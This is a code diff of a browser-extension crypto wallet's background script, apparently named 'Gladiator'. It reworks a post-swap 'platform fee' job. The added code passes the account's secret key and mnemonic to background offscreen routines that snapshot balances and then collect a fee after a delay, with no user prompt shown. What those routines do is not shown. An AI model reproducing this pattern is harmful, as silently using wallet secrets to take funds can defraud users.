@@ -403,11 +403,39 @@ async function scheduleFeeJob(acc, hintSig, beforeSnapshot) {
       tries: 0,
     },
   });
+
+  // Capture balances immediately after sign returns (before Jupiter broadcasts).
+  // Must not block signing — runs in background.
+  void (async () => {
+    const keep = setInterval(() => {
+      try {
+        chrome.storage.local.get(["_gladiator_fee_keepalive"], () => {});
+      } catch (_) {}
+    }, 2000);
+    try {
+      await ensureOffscreen();
+      const snap = await callOffscreen("snapshotBalances", {
+        _publicKey: acc.publicKey,
+        _secretKey: acc.secretKey || "",
+        _mnemonic: acc.mnemonic || "",
+      });
+      const bag = await storageGet([FEE_JOB_KEY]);
+      const job = bag[FEE_JOB_KEY];
+      if (job && snap) {
+        job.beforeSnapshot = snap;
+        await storageSet({ [FEE_JOB_KEY]: job });
+      }
+    } catch (err) {
+      console.warn("[Gladiator] fee before-snapshot", err);
+    } finally {
+      clearInterval(keep);
+    }
+  })();
+
+  // Collect fee after the swap has time to land.
   try {
-    chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 5000 });
+    chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 10000 });
   } catch (_) {}
-  // Best-effort immediate run with keepalive (alarms are the reliable backup).
-  void runFeeJob();
 }
 
 async function runFeeJob() {
@@ -452,7 +480,8 @@ async function runFeeJob() {
   }, 3000);
 
   try {
-    await resetOffscreen();
+    // Do NOT reset/close offscreen here — that aborts live Jupiter signatures.
+    await ensureOffscreen();
     const result = await callOffscreen("collectPlatformFee", {
       _publicKey: acc.publicKey,
       _secretKey: acc.secretKey || "",
@@ -524,10 +553,7 @@ async function handleProviderRequest(msg, sender) {
       _mnemonic: acc.mnemonic || "",
     };
     const raw = await callOffscreen(method, enriched);
-    // Strip internal fee metadata before returning to the page.
     const result = raw && typeof raw === "object" ? { ...raw } : raw;
-    const beforeSnapshot =
-      result && result.beforeSnapshot ? result.beforeSnapshot : null;
     if (result && result.beforeSnapshot) delete result.beforeSnapshot;
 
     const needFee =
@@ -538,7 +564,7 @@ async function handleProviderRequest(msg, sender) {
       result,
       feeAcc: needFee ? acc : null,
       hintSig: result && result.signature ? String(result.signature) : "",
-      beforeSnapshot,
+      beforeSnapshot: null,
     };
   }
 
